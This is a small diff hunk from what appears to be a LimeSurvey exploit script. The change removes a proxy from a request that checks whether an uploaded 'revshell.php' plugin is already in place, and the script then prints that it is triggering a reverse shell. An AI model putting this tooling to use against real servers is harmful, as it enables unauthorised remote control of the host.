@@ -166,7 +166,7 @@ def limesurvey_login(username, password):
 def upload_plugin(session):
     # Check if plugin already exists
     revshell_url = f"{LIMESURVEY_URL}/upload/plugins/pwned/revshell.php"
-    check = session.get(revshell_url, verify=False, proxies=PROXY)
+    check = session.get(revshell_url, verify=False)
     if check.status_code == 200:
         print("[!] Plugin already deployed. Triggering reverse shell...")
         return True
